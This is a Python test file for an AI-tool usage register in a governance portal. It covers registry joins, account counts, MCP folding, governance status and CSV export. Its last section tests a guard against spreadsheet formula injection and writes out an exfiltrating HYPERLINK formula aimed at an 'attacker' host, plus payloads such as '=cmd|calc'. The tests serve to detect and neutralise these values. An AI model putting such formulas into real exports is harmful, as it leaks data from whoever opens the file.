"""The register is what is in use. The registry is a watchlist.

register_from returns the full join, observed and not, and the endpoint shows
the observed set. That split is the point of these tests.

A register is a record of what an organisation actually uses. Listing every
entry of a shipped registry makes it a worse record: it puts tools nobody there
has heard of in front of a management review as though the organisation has a
position on them. The watchlist is context, and its size belongs in a count.

The project's rule that silence is not evidence of safety applies to sources,
not to this. A collector that stops reporting looks identical to a clean
machine, so silent sources must be listed. A registry entry is not a source: a
tool absent from findings is the registry correctly not matching something that
is not there, and coverage is answered by Setup and Uncovered devices.

A tool observed and NOT in the registry is the row that matters. Something is
in use that governance has never considered.

Governance fields are absent rather than empty. The portal holds no governance
state in this release, and an empty owner column reads as "nothing to say" when
the honest reading is "nobody has decided yet".
"""

from app.derive import (
    REGISTER_COLUMNS,
    load_domain_map_from,
    register_csv,
    register_from,
)

REGISTRY = {
    "tools": [
        {
            "id": "claude",
            "name": "Claude",
            "vendor": "Anthropic",
            "category": "assistant",
            "risk_tier": "high",
            "approved": False,
            "domains": ["claude.ai", "anthropic.com"],
        },
        {
            "id": "copilot",
            "name": "GitHub Copilot",
            "vendor": "GitHub",
            "category": "copilot",
            "risk_tier": "medium",
            "approved": True,
        },
        {
            # In the registry, never reported.
            "id": "grok",
            "name": "Grok",
            "vendor": "xAI",
            "category": "assistant",
            "risk_tier": "high",
            "approved": False,
        },
    ]
}
DOMAIN_MAP = load_domain_map_from(REGISTRY)


def _f(**kw):
    base = {
        "tool": "claude", "device": "D1", "surface": "browser",
        "source": "browser_extension", "severity": "info",
        "reported_at": "2026-08-10T09:00:00Z",
    }
    base.update(kw)
    return base


def _row(rows, tool_id):
    return next(r for r in rows if r["id"] == tool_id)


# ─────────────────────────────────────────────
# The two gaps
# ─────────────────────────────────────────────

def test_the_full_join_carries_unobserved_tools_for_counting():
    """register_from returns everything so the watchlist can be counted.

    The caller shows the observed set. Keeping the unobserved rows here rather
    than dropping them early is what lets the page say "30 watched for, 29 not
    seen" without a second pass over the registry, and it is where an
    unobserved tool carrying a real decision will come back into the register
    once decisions exist.
    """
    rows = register_from([_f()], REGISTRY, DOMAIN_MAP)

    grok = _row(rows, "grok")
    assert grok["in_registry"] is True
    assert grok["observed"] is False
    assert grok["devices"] == 0
    assert grok["first_seen"] == ""


def test_the_observed_set_is_what_a_register_shows():
    """The filter the endpoint applies, asserted on the shape it produces.

    One tool in use on this fixture, not three, and not the whole registry.
    """
    rows = register_from([_f()], REGISTRY, DOMAIN_MAP)
    in_use = [r for r in rows if r["observed"]]

    assert [r["id"] for r in in_use] == ["claude"]


def test_an_observed_tool_missing_from_the_registry_is_flagged():
    """Something in use that governance has never considered."""
    rows = register_from([_f(tool="notion-ai")], REGISTRY, DOMAIN_MAP)

    notion = _row(rows, "notion-ai")
    assert notion["observed"] is True
    assert notion["in_registry"] is False
    assert notion["approved"] is None, "unknown, not 'not approved'"


def test_observed_rows_sort_above_unobserved_ones():
    """An unobserved tool is a real row but not the first thing to read."""
    rows = register_from([_f()], REGISTRY, DOMAIN_MAP)
    observed = [r["observed"] for r in rows]
    assert observed == sorted(observed, reverse=True)


# ─────────────────────────────────────────────
# Joining observations to the registry
# ─────────────────────────────────────────────

def test_a_tool_reported_by_domain_and_by_id_is_one_row():
    """The browser extension reports the domain, everything else the id."""
    rows = register_from(
        [_f(tool="claude.ai", device="D1"), _f(tool="claude", device="D2")],
        REGISTRY, DOMAIN_MAP,
    )
    claude = _row(rows, "claude")
    assert claude["devices"] == 2
    assert not any(r["id"] == "claude.ai" for r in rows)


def test_registry_metadata_is_carried_through():
    rows = register_from([_f()], REGISTRY, DOMAIN_MAP)
    claude = _row(rows, "claude")
    assert claude["name"] == "Claude"
    assert claude["vendor"] == "Anthropic"
    assert claude["risk_tier"] == "high"
    assert claude["approved"] is False


def test_approved_is_reported_not_decided():
    """The portal has no governance state and must not imply otherwise.

    approved comes from the registry as it stands: True, False, or None when
    the tool is not in the registry at all. Three states, and None is not the
    same as False.
    """
    rows = register_from([_f(tool="copilot"), _f(tool="unknown-tool")],
                         REGISTRY, DOMAIN_MAP)
    assert _row(rows, "copilot")["approved"] is True
    assert _row(rows, "claude")["approved"] is False
    assert _row(rows, "unknown-tool")["approved"] is None


def test_first_and_last_seen_span_the_findings():
    rows = register_from([
        _f(reported_at="2026-08-01T00:00:00Z"),
        _f(reported_at="2026-08-12T00:00:00Z"),
        _f(reported_at="2026-08-05T00:00:00Z"),
    ], REGISTRY, DOMAIN_MAP)
    claude = _row(rows, "claude")
    assert claude["first_seen"] == "2026-08-01T00:00:00Z"
    assert claude["last_seen"] == "2026-08-12T00:00:00Z"


# ─────────────────────────────────────────────
# Accounts
# ─────────────────────────────────────────────

def test_corporate_and_personal_accounts_are_counted_separately():
    """The same tool on a corporate account and a personal one is the
    distinction this platform exists for. Collapsing them into one number
    would lose it."""
    rows = register_from([
        _f(account_domain="example.com", severity="info"),
        _f(account_domain="gmail.com", severity="warn"),
        _f(account_domain="outlook.com", severity="warn"),
    ], REGISTRY, DOMAIN_MAP)

    claude = _row(rows, "claude")
    assert claude["corporate_accounts"] == 1
    assert claude["personal_accounts"] == 2


def test_personal_follows_the_reporter_not_the_portal():
    """severity == warn with an account domain, the same rule the personal
    accounts view uses. The portal does not re-derive it from a domain list it
    may not hold, because two definitions that disagree is worse than one that
    is occasionally coarse."""
    rows = register_from(
        [_f(account_domain="gmail.com", severity="info")],
        REGISTRY, DOMAIN_MAP,
    )
    claude = _row(rows, "claude")
    assert claude["personal_accounts"] == 0
    assert claude["corporate_accounts"] == 1


def test_a_tool_seen_with_no_account_is_observed_with_no_accounts():
    """A software inventory finding proves presence and says nothing about
    the account. That is not the same as no accounts existing."""
    rows = register_from([_f(source="intune_app", account_domain="")],
                         REGISTRY, DOMAIN_MAP)
    claude = _row(rows, "claude")
    assert claude["observed"] is True
    assert claude["corporate_accounts"] == 0
    assert claude["personal_accounts"] == 0


# ─────────────────────────────────────────────
# Exclusions, consistent with the rest of the portal
# ─────────────────────────────────────────────

def test_the_platforms_own_agents_are_not_tools():
    rows = register_from([_f(tool="paste-guard"), _f(tool="ai-guard-collector")],
                         REGISTRY, DOMAIN_MAP)
    assert not any(r["observed"] for r in rows)


def test_bridge_findings_are_not_a_tool_inventory():
    """The bridge records where an AI tool was reached, not that someone
    installed it."""
    rows = register_from([_f(tool="openai", source="sentinelone_bridge")],
                         REGISTRY, DOMAIN_MAP)
    assert not any(r["id"] == "openai" and r["observed"] for r in rows)


def test_no_registry_still_produces_a_register():
    """A registry that failed to load degrades to observations only, which is
    a worse register rather than a broken page."""
    rows = register_from([_f(tool="claude")], None, {})
    assert len(rows) == 1
    assert rows[0]["in_registry"] is False


# ─────────────────────────────────────────────
# CSV
# ─────────────────────────────────────────────

def test_csv_has_a_header_and_a_row_per_tool():
    rows = register_from([_f()], REGISTRY, DOMAIN_MAP)
    out = register_csv(rows).splitlines()
    assert out[0] == ",".join(REGISTER_COLUMNS)
    assert len(out) == len(rows) + 1


def test_csv_carries_the_same_rows_as_the_page():
    """The export is the register, so it is the observed set.

    A CSV that quietly contained more than the page it was downloaded from
    would be worse than useless in a review: the two would disagree and nobody
    would know which was the register.
    """
    rows = [r for r in register_from([_f()], REGISTRY, DOMAIN_MAP)
            if r["observed"]]
    out = register_csv(rows)

    assert "claude," in out
    assert "grok" not in out


def test_csv_flattens_lists_without_breaking_columns():
    rows = register_from([_f(surface="browser"), _f(surface="ide")],
                         REGISTRY, DOMAIN_MAP)
    line = [r for r in register_csv(rows).splitlines() if r.startswith("claude,")][0]
    assert "browser;ide" in line
    assert line.count(",") == len(REGISTER_COLUMNS) - 1


def test_csv_renders_an_absent_approval_as_empty_not_false():
    """None means the tool is not in the registry. Writing it as False would
    assert a decision nobody made."""
    rows = register_from([_f(tool="unknown-tool")], REGISTRY, DOMAIN_MAP)
    line = [r for r in register_csv(rows).splitlines()
            if r.startswith("unknown-tool,")][0]
    assert ",," in line
    assert "False" not in line.split(",")[5:6]


# ─────────────────────────────────────────────
# MCP findings are evidence of a tool, not a tool
# ─────────────────────────────────────────────

def test_mcp_findings_fold_into_the_tool_that_configured_them():
    """claude-code-mcp is not a different tool from claude-code.

    Left as its own row it is a permanent "not in registry" entry that can
    never be resolved, because nobody would add claude-code-mcp to a registry
    of tools. The MCP view is where a row is a server; here it is evidence the
    tool is on that machine.
    """
    reg = {"tools": [{"id": "claude-code", "name": "Claude Code",
                      "approved": False}]}
    rows = register_from([
        _f(tool="claude-code", surface="cli", device="D1"),
        _f(tool="claude-code-mcp", surface="mcp", device="D2"),
    ], reg, {})

    assert [r["id"] for r in rows] == ["claude-code"]
    assert rows[0]["devices"] == 2
    assert rows[0]["in_registry"] is True


def test_the_older_mcp_name_format_folds_too():
    """Collectors older than the current ones put the server list in the tool
    name. Loki holds both formats for as long as the lookback window."""
    reg = {"tools": [{"id": "claude-code", "name": "Claude Code",
                      "approved": False}]}
    rows = register_from(
        [_f(tool="claude-code-mcp:atlassian,figma", surface="mcp")], reg, {})

    assert [r["id"] for r in rows] == ["claude-code"]
    assert rows[0]["surfaces"] == ["mcp"]


def test_a_tool_named_only_mcp_is_left_alone():
    """Stripping the suffix must not produce an empty tool id."""
    rows = register_from([_f(tool="-mcp")], {}, {})
    assert [r["id"] for r in rows] == ["-mcp"]


def test_an_unobserved_tool_is_not_in_the_endpoints_rows():
    """The filter lives in the endpoint, not in register_from, so a unit test
    of the derivation alone would miss it.

    Calls the endpoint function rather than going over HTTP. TestClient would
    read better, but it pulls in httpx, which is not in the portal's lockfile
    and which starlette is currently migrating away from in favour of httpx2.
    A test that needs a dependency the thing it tests does not is a test that
    breaks for reasons unrelated to the code.
    """
    import json
    from unittest.mock import patch

    from app import derive
    from app import main as pm

    with patch.object(pm, "_findings", lambda h: [_f()]), \
            patch.object(derive, "load_registry", lambda p: REGISTRY):
        pm._cache.clear()
        body = json.loads(bytes(pm.register(hours=168).body))

    assert [r["id"] for r in body["rows"]] == ["claude"]
    # The watchlist is still reported, as a count.
    assert body["tools_known"] == 3
    assert body["known_not_observed"] == 2
    assert body["tools_observed"] == 1


# ─────────────────────────────────────────────
# Governance joined onto the register
# ─────────────────────────────────────────────

def _gov(**tools):
    from app.governance import load_governance_from
    return load_governance_from({"tools": tools})


def test_a_decision_reaches_the_row():
    gov = _gov(claude={"status": "approved", "owner": "Engineering",
                       "review_due": "2027-01-01"})
    row = _row(register_from([_f()], REGISTRY, DOMAIN_MAP, gov), "claude")

    assert row["status"] == "approved"
    assert row["owner"] == "Engineering"
    assert row["review_due"] == "2027-01-01"
    assert row["status_source"] == "governance"


def test_an_expired_approval_reaches_the_row_as_reviewing():
    """The compound case, end to end. A register that read stored_status here
    would show a lapsed approval as current."""
    gov = _gov(claude={"status": "approved", "review_due": "2020-01-01"})
    row = _row(register_from([_f()], REGISTRY, DOMAIN_MAP, gov), "claude")

    assert row["status"] == "reviewing"
    assert row["stored_status"] == "approved"
    assert row["status_reason"] == "approval_expired"
    assert row["days_overdue"] > 0


def test_no_governance_falls_back_to_the_registry_flag():
    """A deployment that has not adopted governance must be unchanged."""
    row = _row(register_from([_f()], REGISTRY, DOMAIN_MAP), "claude")

    assert row["status"] == "not_approved"
    assert row["status_source"] == "registry_default"
    assert row["owner"] == ""


def test_a_tool_outside_the_registry_is_undecided_not_refused():
    row = _row(register_from([_f(tool="notion-ai")], REGISTRY, DOMAIN_MAP),
               "notion-ai")

    assert row["status"] == ""
    assert row["status_source"] == "unknown"


def test_the_csv_carries_the_decision():
    """An export missing the decision is a list of tools, not a register."""
    gov = _gov(claude={"status": "approved", "owner": "Engineering",
                       "review_due": "2027-01-01"})
    rows = [r for r in register_from([_f()], REGISTRY, DOMAIN_MAP, gov)
            if r["observed"]]
    out = register_csv(rows)

    assert "status" in out.splitlines()[0]
    assert "owner" in out.splitlines()[0]
    assert "Engineering" in out
    assert "2027-01-01" in out


# ─────────────────────────────────────────────
# Exports a spreadsheet will not execute
# ─────────────────────────────────────────────

class TestCsvIsNotExecutable:
    """A CSV export is opened in Excel, and Excel runs formulas.

    csv handles commas and quotes and has no opinion about formulas, because
    they are not a CSV concept. Every major spreadsheet evaluates a cell
    starting with = + - or @, so a device named

        =HYPERLINK("http://attacker/"&A1)

    exfiltrates the row beside it when somebody opens the file. Device names,
    usernames and tool ids all come from reporting sources, and the register is
    exported precisely so it can be handed to somebody in a spreadsheet.
    """

    def test_a_formula_is_prefixed(self):
        from app.derive import csv_safe

        assert csv_safe('=HYPERLINK("http://x")').startswith("'")

    def test_every_dangerous_lead_character(self):
        from app.derive import csv_safe

        for lead in ("=", "+", "-", "@"):
            assert csv_safe(lead + "SUM(A1)").startswith("'"), lead

    def test_leading_whitespace_does_not_hide_it(self):
        """The spreadsheet strips the whitespace and runs what is left.

        A first version tested the string with the whitespace already removed,
        so a value beginning with a tab was only caught when the character
        after the tab was also dangerous. A leading tab is itself the problem.
        """
        from app.derive import csv_safe

        for value in ("\t=cmd", "\r=cmd", " =cmd", "\n=cmd", "\tcmd"):
            assert csv_safe(value).startswith("'"), repr(value)

    def test_ordinary_values_are_untouched(self):
        """The export still has to be readable. A prefix on every cell would be
        safe and useless."""
        from app.derive import csv_safe

        for value in ("chatgpt", "a=b", "OpenAI", "2026-08-12", ""):
            assert csv_safe(value) == value, repr(value)

    def test_the_register_export_guards_its_cells(self):
        from app.derive import register_csv, register_from

        rows = [r for r in register_from(
            [_f(tool="=cmd|calc", device="D1")], {}, {}) if r["observed"]]
        out = register_csv(rows)

        assert "'=cmd|calc" in out
        assert "\n=cmd" not in out

    def test_a_list_field_is_guarded_after_joining(self):
        """surfaces and sources are joined with semicolons before writing, so
        the guard has to run on the joined string rather than the parts."""
        from app.derive import register_csv, register_from

        rows = [r for r in register_from(
            [_f(surface="=cmd")], {}, {}) if r["observed"]]

        assert "'=cmd" in register_csv(rows)